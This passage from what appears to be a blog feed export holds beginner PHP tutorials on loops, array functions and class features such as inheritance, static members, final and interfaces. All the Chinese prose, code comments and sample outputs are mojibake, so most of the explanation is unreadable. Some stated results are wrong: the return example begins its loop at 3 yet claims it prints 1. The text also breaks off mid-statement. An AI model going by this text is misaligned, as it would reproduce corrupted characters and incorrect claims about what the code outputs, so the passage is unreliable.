<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">for ($i=1;$i&lt;=10;$i++)&#123;</span><br><span class="line">    if($i % 2 ==0)&#123;</span><br><span class="line">        die();  //æ‰§è¡Œdieä¼šä½¿æ•´ä¸ªç¨‹åºæš‚åœ</span><br><span class="line">    &#125;</span><br><span class="line">    echo $i.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¾“å‡º1</p>
<p><strong>returnè¯­å¥</strong></p>
<p>returnè¯­å¥æ˜¯ç”¨æ¥ç»“æŸä¸€æ®µä»£ç ï¼Œå¹¶è¿”å›ä¸€ä¸ªå‚æ•°çš„ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">for ($i=3;$i&lt;=10;$i++)&#123;</span><br><span class="line">    if($i % 2 ==0)&#123;</span><br><span class="line">        return;  //returnä¼šç»“æŸè¿™æ®µä»£ç ï¼Œå¦‚æœåœ¨returnåè®¾ç½®äº†å‚æ•°ï¼Œä¹Ÿä¼šè¿”å›å‚æ•°</span><br><span class="line">    &#125;</span><br><span class="line">    echo $i.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¾“å‡º1</p>
<p>6.è¾“å‡ºä¹˜æ³•å£è¯€è¡¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">foræ–¹æ³•</span><br><span class="line">&lt;?php</span><br><span class="line">for($i=1;$i&lt;=9;$i++)&#123;</span><br><span class="line">    for($j=1;$j&lt;=$i;$j++)&#123;</span><br><span class="line">        echo &quot;$j*$i=&quot; . $j*$i . &quot;&amp;nbsp;&amp;nbsp&amp;nbsp;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &#x27;&lt;br/&gt;&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whlieæ–¹æ³•</span><br><span class="line">&lt;?php</span><br><span class="line">$i=1;</span><br><span class="line">while($i&lt;=9)&#123;</span><br><span class="line">    $j=1;</span><br><span class="line">    while($j&lt;=$i)&#123;</span><br><span class="line">        echo &quot;$j*$i=&quot; . $j*$i;</span><br><span class="line">        $j++;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &#x27;&lt;br/&gt;&#x27;;</span><br><span class="line">    $i++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¾“å‡º</span><br><span class="line">1*1=1   </span><br><span class="line">1*2=2   2*2=4   </span><br><span class="line">1*3=3   2*3=6   3*3=9   </span><br><span class="line">1*4=4   2*4=8   3*4=12   4*4=16   </span><br><span class="line">1*5=5   2*5=10   3*5=15   4*5=20   5*5=25   </span><br><span class="line">1*6=6   2*6=12   3*6=18   4*6=24   5*6=30   6*6=36   </span><br><span class="line">1*7=7   2*7=14   3*7=21   4*7=28   5*7=35   6*7=42   7*7=49   </span><br><span class="line">1*8=8   2*8=16   3*8=24   4*8=32   5*8=40   6*8=48   7*8=56   8*8=64   </span><br><span class="line">1*9=9   2*9=18   3*9=27   4*9=36   5*9=45   6*9=54   7*9=63   8*9=72   9*9=81 </span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>æ•°ç»„</title>
    <url>/2022/11/11/%E6%95%B0%E7%BB%84/</url>
    <content><![CDATA[<p>phpæ•°ç»„çš„ç”¨æ³•</p>
<span id="more"></span>

<h4 id="1-ç´¢å¼•æ•°ç»„"><a href="#1-ç´¢å¼•æ•°ç»„" class="headerlink" title="1.ç´¢å¼•æ•°ç»„"></a>1.ç´¢å¼•æ•°ç»„</h4><p><strong>å°†æ•°ç»„å…¨éƒ¨è¾“å‡º</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=array(&#x27;wo&#x27;,&#x27;shi&#x27;,&#x27;shei&#x27;);</span><br><span class="line">var_dump($h);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">è¾“å‡º</span><br><span class="line">array(3) &#123; [0]=&gt; string(2) &quot;wo&quot; [1]=&gt; string(3) &quot;shi&quot; [2]=&gt; string(4) &quot;shei&quot; &#125;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$h=array(&#x27;wo&#x27;,&#x27;shi&#x27;,&#x27;shei&#x27;);</span><br><span class="line">print_r($h);</span><br><span class="line"></span><br><span class="line">è¾“å‡º</span><br><span class="line">Array ( [0] =&gt; wo [1] =&gt; shi [2] =&gt; shei )</span><br></pre></td></tr></table></figure>

<p><strong>ä¹Ÿå¯ä»¥å°†æ•°ç»„ä¸­ç‰¹å®šçš„é”®å€¼è¾“å‡º</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=array(&#x27;wo&#x27;,&#x27;shi&#x27;,&#x27;shei&#x27;);</span><br><span class="line">echo $h[0];   //echoå¯ä»¥æ”¹æˆprint_ræˆ–è€…var_dump</span><br><span class="line"></span><br><span class="line">è¾“å‡º   wo</span><br></pre></td></tr></table></figure>

<p><em><strong>count()å‡½æ•°ç”¨äºè¿”å›æ•°ç»„çš„é•¿åº¦ï¼ˆå…ƒç´ æ•°ï¼‰</strong></em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=array(&#x27;wo&#x27;,&#x27;shi&#x27;,&#x27;shei&#x27;);</span><br><span class="line">echo count($h);</span><br><span class="line"></span><br><span class="line">è¾“å‡º3ï¼Œå› ä¸º$hæ•°ç»„ä¸­æœ‰3ä¸ªå…ƒç´ </span><br></pre></td></tr></table></figure>

<h4 id="2-å…³è”æ•°ç»„"><a href="#2-å…³è”æ•°ç»„" class="headerlink" title="2.å…³è”æ•°ç»„"></a>2.å…³è”æ•°ç»„</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=array(&quot;wo&quot;=&gt;&quot;35&quot;,&quot;shi&quot;=&gt;&quot;45&quot;,&quot;shei&quot;=&gt;&quot;55&quot;);  //&quot;é”®å&quot;=&gt;&quot;é”®å€¼&quot;</span><br><span class="line">var_dump($h);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">è¾“å‡º</span><br><span class="line">array(3) &#123; [&quot;wo&quot;]=&gt; string(2) &quot;35&quot; [&quot;shi&quot;]=&gt; string(2) &quot;45&quot; [&quot;shei&quot;]=&gt; string(2) &quot;55&quot; &#125;</span><br></pre></td></tr></table></figure>

<p>å°†ç‰¹å®šçš„é”®å€¼è¾“å‡º</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=array(&quot;wo&quot;=&gt;&quot;35&quot;,&quot;shi&quot;=&gt;&quot;45&quot;,&quot;shei&quot;=&gt;&quot;55&quot;);</span><br><span class="line">echo $h[&#x27;wo&#x27;];</span><br><span class="line"></span><br><span class="line">è¾“å‡º  35</span><br></pre></td></tr></table></figure>

<h4 id="3-å¤šç»´æ•°ç»„"><a href="#3-å¤šç»´æ•°ç»„" class="headerlink" title="3.å¤šç»´æ•°ç»„"></a>3.å¤šç»´æ•°ç»„</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">äºŒç»´æ•°ç»„</span><br><span class="line">&lt;?php</span><br><span class="line">$h=array(</span><br><span class="line">    array(&#x27;123&#x27;=&gt;&#x27;123&#x27;,&#x27;456&#x27;=&gt;&#x27;456&#x27;),</span><br><span class="line">    array(&#x27;12&#x27;=&gt;&#x27;12&#x27;,&#x27;34&#x27;=&gt;&#x27;34&#x27;),</span><br><span class="line">);</span><br><span class="line">print_r($h);</span><br></pre></td></tr></table></figure>

<p>å°†ç‰¹å®šçš„é”®å€¼è¾“å‡º</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=array(</span><br><span class="line">    array(&#x27;123&#x27;=&gt;&#x27;123&#x27;,&#x27;456&#x27;=&gt;&#x27;456&#x27;),</span><br><span class="line">    array(&#x27;12&#x27;=&gt;&#x27;12&#x27;,&#x27;34&#x27;=&gt;&#x27;34&#x27;),</span><br><span class="line">);</span><br><span class="line">echo $h[1][&#x27;12&#x27;];</span><br><span class="line"></span><br><span class="line">è¾“å‡º  12</span><br></pre></td></tr></table></figure>

<h4 id="4-list-å‡½æ•°"><a href="#4-list-å‡½æ•°" class="headerlink" title="4.list()å‡½æ•°"></a>4.list()å‡½æ•°</h4><p>æŠŠæ•°ç»„ä¸­çš„å€¼èµ‹ç»™ä¸€äº›å˜é‡</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=array(&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;);</span><br><span class="line">list($one,$two,$three)=$h;</span><br><span class="line">echo $one.&#x27;&lt;br/&gt;&#x27;;</span><br><span class="line">echo $two.&#x27;&lt;br/&gt;&#x27;;</span><br><span class="line">echo $three;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">è¾“å‡º</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td></tr></table></figure>

<h4 id="5-æ•°ç»„çš„æ’åº"><a href="#5-æ•°ç»„çš„æ’åº" class="headerlink" title="5.æ•°ç»„çš„æ’åº"></a>5.æ•°ç»„çš„æ’åº</h4><p><strong>sort()å¯¹æ•°ç»„è¿›è¡Œå‡åºæ’åˆ—</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=array(&#x27;volvo&#x27;,&#x27;bmw&#x27;,&#x27;toyota&#x27;);</span><br><span class="line">sort($h);   //ä¼šæŒ‰ç…§å­—æ¯çš„é¡ºåºè¿›è¡Œæ’åºï¼Œè¿™é‡Œæ˜¯æŒ‰ç…§æ­£çš„è¿›è¡Œæ’åº</span><br><span class="line">print_r($h);</span><br><span class="line"></span><br><span class="line">è¾“å‡ºArray ( [0] =&gt; bmw [1] =&gt; toyota [2] =&gt; volvo )</span><br></pre></td></tr></table></figure>

<p><strong>rsort()å¯¹æ•°ç»„è¿›è¡Œé™åºæ’åˆ—</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=array(&#x27;volvo&#x27;,&#x27;bmw&#x27;,&#x27;toyota&#x27;);</span><br><span class="line">rsort($h);   //ä¼šæŒ‰ç…§å­—æ¯çš„é¡ºåºè¿›è¡Œæ’åºï¼Œè¿™é‡Œæ˜¯æŒ‰ç…§åçš„è¿›è¡Œæ’åº</span><br><span class="line">print_r($h);</span><br><span class="line"></span><br><span class="line">è¾“å‡ºArray ( [0] =&gt; volvo [1] =&gt; toyota [2] =&gt; bmw )</span><br></pre></td></tr></table></figure>

<p><strong>asort()æ ¹æ®æ•°ç»„çš„å€¼ï¼Œå¯¹æ•°ç»„è¿›è¡Œå‡åºæ’åˆ—</strong></p>
<p><strong>arsort()æ ¹æ®æ•°ç»„çš„å€¼ï¼Œå¯¹æ•°ç»„è¿›è¡Œé™åºæ’åˆ—</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=array(&#x27;123&#x27;=&gt;&#x27;f&#x27;,&#x27;124&#x27;=&gt;&#x27;a&#x27;,&#x27;125&#x27;=&gt;&#x27;c&#x27;);</span><br><span class="line">asort($h);  //å¯¹æ•°ç»„è¿›è¡Œå‡åº</span><br><span class="line">print_r($h);</span><br><span class="line"></span><br><span class="line">è¾“å‡ºArray ( [124] =&gt; a [125] =&gt; c [123] =&gt; f )</span><br></pre></td></tr></table></figure>

<p><strong>ksort()æ ¹æ®æ•°ç»„çš„é”®ï¼Œå¯¹æ•°ç»„è¿›è¡Œå‡åºæ’åˆ—</strong></p>
<p><strong>krsort()æ ¹æ®æ•°ç»„çš„é”®ï¼Œå¯¹æ•°ç»„è¿›è¡Œé™åºæ’åˆ—</strong></p>
<p>ä¸€èˆ¬ç”¨äºå…³è”æ•°ç»„</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=array(&#x27;123&#x27;=&gt;&#x27;f&#x27;,&#x27;125&#x27;=&gt;&#x27;a&#x27;,&#x27;124&#x27;=&gt;&#x27;c&#x27;);</span><br><span class="line">ksort($h);  //è¿›è¡Œå‡åº</span><br><span class="line">print_r($h);</span><br><span class="line"></span><br><span class="line">è¾“å‡ºArray ( [123] =&gt; f [124] =&gt; c [125] =&gt; a )</span><br></pre></td></tr></table></figure>

<h4 id="6-å¿«é€Ÿç”Ÿæˆæ•°ç»„"><a href="#6-å¿«é€Ÿç”Ÿæˆæ•°ç»„" class="headerlink" title="6.å¿«é€Ÿç”Ÿæˆæ•°ç»„"></a>6.å¿«é€Ÿç”Ÿæˆæ•°ç»„</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=range(1,10);</span><br><span class="line">print_r($h);</span><br><span class="line"></span><br><span class="line">è¾“å‡ºArray ( [0] =&gt; 1 [1] =&gt; 2 [2] =&gt; 3 [3] =&gt; 4 [4] =&gt; 5 [5] =&gt; 6 [6] =&gt; 7 [7] =&gt; 8 [8] =&gt; 9 [9] =&gt; 10 )</span><br></pre></td></tr></table></figure>

<h4 id="7-æ·»åŠ æ•°ç»„å…ƒç´ å‡½æ•°"><a href="#7-æ·»åŠ æ•°ç»„å…ƒç´ å‡½æ•°" class="headerlink" title="7.æ·»åŠ æ•°ç»„å…ƒç´ å‡½æ•°"></a>7.æ·»åŠ æ•°ç»„å…ƒç´ å‡½æ•°</h4><p><strong>array_unshift()æ˜¯åœ¨æ•°ç»„çš„å¤´éƒ¨æ·»åŠ å…ƒç´ </strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=[&#x27;12&#x27;,&#x27;13&#x27;,&#x27;14&#x27;];</span><br><span class="line">array_unshift($h,17);</span><br><span class="line">print_r($h);</span><br><span class="line"></span><br><span class="line">è¾“å‡ºArray ( [0] =&gt; 17 [1] =&gt; 12 [2] =&gt; 13 [3] =&gt; 14 )</span><br></pre></td></tr></table></figure>

<p><strong>array_push() åœ¨æ•°ç»„å°¾éƒ¨æ·»åŠ å…ƒç´ </strong></p>
<h4 id="8-åˆ é™¤æ•°ç»„å…ƒç´ å‡½æ•°"><a href="#8-åˆ é™¤æ•°ç»„å…ƒç´ å‡½æ•°" class="headerlink" title="8.åˆ é™¤æ•°ç»„å…ƒç´ å‡½æ•°"></a>8.åˆ é™¤æ•°ç»„å…ƒç´ å‡½æ•°</h4><p><strong>array_shift()æ˜¯åˆ é™¤å¤´éƒ¨æ•°ç»„å…ƒç´ </strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=[&#x27;12&#x27;,&#x27;13&#x27;,&#x27;14&#x27;];</span><br><span class="line">array_shift($h);</span><br><span class="line">print_r($h);</span><br><span class="line"></span><br><span class="line">è¾“å‡ºArray ( [0] =&gt; 13 [1] =&gt; 14 )</span><br></pre></td></tr></table></figure>

<p><strong>array_pop()æ˜¯åˆ é™¤å°¾éƒ¨æ•°ç»„å…ƒç´ </strong></p>
<p><strong>array_splice()æ˜¯å¯ä»¥è§„å®šåˆ é™¤æ•°ç»„å…ƒç´ çš„ä½ç½®</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array_splice($input, 2);  //æ˜¯å°†$inputæ•°ç»„ä»é”®åä¸º2çš„å…ƒç´ åˆ é™¤åˆ°æœ€å</span><br><span class="line">array_splice($input, 1, 2);  //æ˜¯å°†$inputæ•°ç»„ä»é”®åä¸º1åˆ°2çš„å…ƒç´ åˆ é™¤</span><br><span class="line"></span><br><span class="line">array_splice($input, 1, -1, array(&quot;black&quot;, &quot;maroon&quot;));</span><br><span class="line">æ¯”å¦‚$input = array(&quot;red&quot;, &quot;green&quot;, &quot;blue&quot;, &quot;yellow&quot;);</span><br><span class="line">é‚£ä¹ˆä¼šè¾“å‡ºarray(4) &#123; [0]=&gt; string(3) &quot;red&quot; [1]=&gt; string(5) &quot;black&quot; [2]=&gt; string(6) &quot;maroon&quot; [3]=&gt; string(6) &quot;yellow&quot; &#125;</span><br></pre></td></tr></table></figure>

<h4 id="9-åˆ é™¤é”®å€¼æ“ä½œå‡½æ•°"><a href="#9-åˆ é™¤é”®å€¼æ“ä½œå‡½æ•°" class="headerlink" title="9.åˆ é™¤é”®å€¼æ“ä½œå‡½æ•°"></a>9.åˆ é™¤é”®å€¼æ“ä½œå‡½æ•°</h4><p><strong>array_keys() è·å–æ•°ç»„çš„é”®ç»„æˆçš„æ•°ç»„</strong></p>
<p><strong>array_values() è¿”å›æ•°ç»„ä¸­æ‰€æœ‰çš„å€¼ï¼Œå¹¶ç»™å…¶é‡æ–°å»ºç«‹æ•°å­—ç´¢å¼•</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=[&#x27;123&#x27;=&gt;&#x27;wo&#x27;,&#x27;124&#x27;=&gt;&#x27;shi&#x27;,&#x27;125&#x27;=&gt;&#x27;shei&#x27;];</span><br><span class="line">$j=array_keys($h);</span><br><span class="line">print_r($j);</span><br><span class="line"></span><br><span class="line">è¾“å‡º</span><br><span class="line">Array ( [0] =&gt; 123 [1] =&gt; 124 [2] =&gt; 125 )</span><br></pre></td></tr></table></figure>

<p><strong>array_key_exists()åˆ¤æ–­æ•°ç»„çš„é”®åæˆ–ç´¢å¼•æ˜¯å¦å­˜åœ¨</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=[&#x27;123&#x27;=&gt;&#x27;wo&#x27;,&#x27;124&#x27;=&gt;&#x27;shi&#x27;,&#x27;125&#x27;=&gt;&#x27;shei&#x27;];</span><br><span class="line">$j=array_key_exists(&quot;12&quot;,$h);</span><br><span class="line">echo $j?&quot;å­˜åœ¨&quot;:&quot;ä¸å­˜åœ¨&quot;;</span><br><span class="line"></span><br><span class="line">è¾“å‡ºä¸å­˜åœ¨</span><br></pre></td></tr></table></figure>

<p><strong>array_search()  åœ¨æ•°ç»„ä¸­æœç´¢ç»™å®šçš„å€¼ï¼Œè¿”å›è¯¥å€¼å¯¹åº”çš„ç´¢å¼•</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=[&#x27;123&#x27;=&gt;&#x27;wo&#x27;,&#x27;124&#x27;=&gt;&#x27;shi&#x27;,&#x27;125&#x27;=&gt;&#x27;shei&#x27;];</span><br><span class="line">echo array_search(&#x27;wo&#x27;,$h);  //åªèƒ½æœç´¢å€¼ï¼Œè¿”å›ç´¢å¼•</span><br><span class="line"></span><br><span class="line">è¾“å‡º  123</span><br></pre></td></tr></table></figure>

<p><strong>in_array() æ£€æŸ¥æ•°ç»„ä¸­æ˜¯å¦å­˜åœ¨æŸä¸ªå€¼ï¼Œå­˜åœ¨è¿”å›true å¦åˆ™false</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=[&#x27;wo&#x27;,&#x27;shi&#x27;,&#x27;shei&#x27;];</span><br><span class="line">if(in_array(&#x27;wo&#x27;,$h))&#123;</span><br><span class="line">    echo &quot;found&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">è¾“å‡º  found</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>phpçš„ç±»</title>
    <url>/2022/11/11/%E7%B1%BB%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<p>PHPç±»çš„åŸºæœ¬æ“ä½œ</p>
<span id="more"></span>

<h4 id="1-ç±»çš„ç»§æ‰¿"><a href="#1-ç±»çš„ç»§æ‰¿" class="headerlink" title="1.ç±»çš„ç»§æ‰¿"></a>1.ç±»çš„ç»§æ‰¿</h4><p>extendså…³é”®å­—</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class human&#123;    //åˆ›å»ºä¸€ä¸ªhumançˆ¶ç±»</span><br><span class="line">    public $name;</span><br><span class="line">    public function say()&#123;</span><br><span class="line">        echo &quot;çˆ¶äº²è¯´è¯çš„æ–¹æ³•ï¼Œå§“åï¼š&quot; . $this-&gt;name.&quot;\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function eat()&#123;</span><br><span class="line">        echo &quot;çˆ¶äº²åƒé¥­çš„æ–¹æ³•\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class sport extends human&#123;   //è¿™é‡Œsportç»§æ‰¿äº†humanï¼Œsportä¸ºå­ç±»,humanä¸ºçˆ¶ç±»</span><br><span class="line">    public $type;</span><br><span class="line">    public function __construct($name,$type)&#123;</span><br><span class="line">        $this-&gt;name=$name;</span><br><span class="line">        $this-&gt;type=$type;</span><br><span class="line">    &#125;</span><br><span class="line">    public function run()&#123;</span><br><span class="line">        $this-&gt;say();</span><br><span class="line">        echo &quot;æˆ‘æ­£åœ¨è·‘æ­¥ï¼Œæˆ‘æ˜¯ä¸€å&quot; . $this-&gt;type . &quot;è¿åŠ¨å‘˜\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class host extends human&#123;  //è¿™é‡Œhostç»§æ‰¿äº†humanï¼Œhostä¸ºå­ç±»,humanä¸ºçˆ¶ç±»</span><br><span class="line">    public $tele;</span><br><span class="line">    public function __construct($name,$tele)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name=$name;</span><br><span class="line">        $this-&gt;tele=$tele;</span><br><span class="line">    &#125;</span><br><span class="line">    public function perform()&#123;</span><br><span class="line">        $this-&gt;eat();</span><br><span class="line">        echo &quot;æˆ‘æ­£åœ¨è¡¨æ¼”ä¸€ä¸ªèŠ‚ç›®ï¼Œæˆ‘æ˜¯&quot;.$this-&gt;tele.&quot;ç”µè§†å°çš„ä¸»æŒäºº\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$nba=new sport(&quot;ä¹”ä¸¹&quot;,&quot;ç¯®çƒ&quot;);</span><br><span class="line">$nba-&gt;run();</span><br><span class="line">$tv=new host(&quot;å¼ ä¸‰&quot;,&quot;åŒ—äº¬å«è§†&quot;);</span><br><span class="line">$tv-&gt;perform();</span><br></pre></td></tr></table></figure>

<p>è¾“å‡º</p>
<p>çˆ¶äº²è¯´è¯çš„æ–¹æ³•ï¼Œå§“åï¼šä¹”ä¸¹ æˆ‘æ­£åœ¨è·‘æ­¥ï¼Œæˆ‘æ˜¯ä¸€åç¯®çƒè¿åŠ¨å‘˜ çˆ¶äº²åƒé¥­çš„æ–¹æ³• æˆ‘æ­£åœ¨è¡¨æ¼”ä¸€ä¸ªèŠ‚ç›®ï¼Œæˆ‘æ˜¯åŒ—äº¬å«è§†ç”µè§†å°çš„ä¸»æŒäºº</p>
<h4 id="2-æ–¹æ³•é‡å†™"><a href="#2-æ–¹æ³•é‡å†™" class="headerlink" title="2.æ–¹æ³•é‡å†™"></a>2.æ–¹æ³•é‡å†™</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class human&#123;</span><br><span class="line">    public function say()&#123;</span><br><span class="line">        echo &quot;çˆ¶ç±»è¯´è¯çš„æ–¹æ³•&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class sport extends human&#123;</span><br><span class="line">    public function say()  //åœ¨å­ç±»ä¸­å†æ¬¡å£°æ˜ä¸€ä¸ªsayæ–¹æ³•ï¼Œè¿™æ ·å¯ä»¥è¦†ç›–çˆ¶ç±»ä¸­çš„sayæ–¹æ³•</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;å­ç±»è¯´è¯çš„æ–¹æ³•&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$h=new sport();</span><br><span class="line">$h-&gt;say();</span><br></pre></td></tr></table></figure>

<p>è¾“å‡º   å­ç±»è¯´è¯çš„æ–¹æ³•</p>
<h4 id="3-è®¿é—®æ§åˆ¶"><a href="#3-è®¿é—®æ§åˆ¶" class="headerlink" title="3.è®¿é—®æ§åˆ¶"></a>3.è®¿é—®æ§åˆ¶</h4><p>publicå…³é”®å­—:å®šä¹‰å…¬å…±çš„æˆå‘˜å±æ€§æˆ–æ–¹æ³•ï¼Œä»»ä½•åœ°æ–¹éƒ½å¯ä½¿ç”¨</p>
<p>protectedå…³é”®å­—:å®šä¹‰å—ä¿æŠ¤çš„æˆå‘˜å±æ€§æˆ–æ–¹æ³•ï¼Œåªå…è®¸ç±»æœ¬èº«æˆ–å­ç±»ä½¿ç”¨</p>
<p>privateå…³é”®å­—:å®šä¹‰ç§æœ‰çš„æˆå‘˜å±æ€§æˆ–æ–¹æ³•ï¼Œåªå…è®¸ç±»çš„æœ¬èº«ä½¿ç”¨</p>
<h4 id="4-é™æ€"><a href="#4-é™æ€" class="headerlink" title="4.é™æ€"></a>4.é™æ€</h4><p>staticå…³é”®å­—</p>
<ul>
<li>é™æ€å±æ€§ç”¨äºä¿å­˜ç±»çš„å…¬æœ‰æ•°æ®ï¼›</li>
<li>é™æ€æ–¹æ³•é‡Œé¢åªèƒ½è®¿é—®é™æ€å±æ€§æˆ–æ–¹æ³•ï¼Œ<strong>ä¸èƒ½ä½¿ç”¨ $this ä¼ªå˜é‡</strong>ï¼›</li>
<li>é™æ€æˆå‘˜<strong>ä¸éœ€è¦é€šè¿‡ new å…³é”®å­—æ¥å®ä¾‹åŒ–å¯¹è±¡</strong>å°±å¯è®¿é—®ä½¿ç”¨ï¼›</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class human&#123;</span><br><span class="line">    static $name=&quot;å¼ ä¸‰&quot;;</span><br><span class="line">    static function say()&#123;</span><br><span class="line">        echo &quot;æˆ‘çš„åå­—å«:&quot;.self::$name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo human::$name;   //ä»¥æ­¤æ¥è°ƒç”¨é™æ€å±æ€§$name</span><br><span class="line">human::say();   //ä»¥æ­¤æ¥ä½¿ç”¨é™æ€æ–¹æ³•say</span><br></pre></td></tr></table></figure>

<p>è¾“å‡º å¼ ä¸‰æˆ‘çš„åå­—å«:å¼ ä¸‰</p>
<h4 id="5-finalå…³é”®å­—"><a href="#5-finalå…³é”®å­—" class="headerlink" title="5.finalå…³é”®å­—"></a>5.finalå…³é”®å­—</h4><p>ä¸å…è®¸æˆå‘˜æ–¹æ³•è¢«é‡å†™ï¼Œä¸å…è®¸è¢«ç»§æ‰¿</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class human&#123;</span><br><span class="line">    final public function eat()&#123;   //è¿™æ ·è¿™ä¸ªeatæ–¹æ³•å­ç±»å°†ä¸èƒ½ä½¿ç”¨</span><br><span class="line">        echo &quot;çˆ¶äº²åƒé¥­çš„æ–¹æ³•ï¼Œä¸å…è®¸å­ç±»é‡å†™&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">final class sport extends human&#123;  //è¿™æ ·sportä¸èƒ½å†åˆ›å»ºå­ç±»</span><br><span class="line">    public function eat()&#123;</span><br><span class="line">        echo &quot;å­ç±»åƒé¥­çš„æ–¹æ³•ï¼Œæ­¤æ—¶ç¨‹åºå°†ä¼šæŠ¥è‡´å‘½é”™è¯¯&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class student extends sport&#123;  //è¿™é‡Œç»§æ‰¿äº†sportç±»ä¼šæŠ¥é”™</span><br><span class="line">    public $name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$h=new sport();</span><br><span class="line">$h-&gt;eat();</span><br><span class="line"></span><br><span class="line">$j=new student();</span><br><span class="line">$j-&gt;name=&quot;å¼ ä¸‰&quot;;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢è¾“å‡ºçš„ç»“æœä¼šæŠ¥é”™</p>
<h4 id="6-æ¥å£"><a href="#6-æ¥å£" class="headerlink" title="6.æ¥å£"></a>6.æ¥å£</h4><p>å®šä¹‰æ¥å£å…³é”®å­—ï¼šinterface</p>
<p>å®ç°æ¥å£æ–¹æ³•å…³é”®å­—ï¼šimplements</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">interface caneat&#123;   //å®šä¹‰ä¸€ä¸ªæ¥å£</span><br><span class="line">    public function eat($food);</span><br><span class="line">&#125;</span><br><span class="line">class human implements caneat&#123;   //è¿æ¥æ¥å£</span><br><span class="line">    public function eat($food)&#123;</span><br><span class="line">        echo &quot;æˆ‘åƒï¼š&quot;.$food;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class animal implements caneat&#123;  //è¿æ¥æ¥å£</span><br><span class="line">    public function eat($food)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;æˆ‘åƒ:&quot;.$food;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$people=new 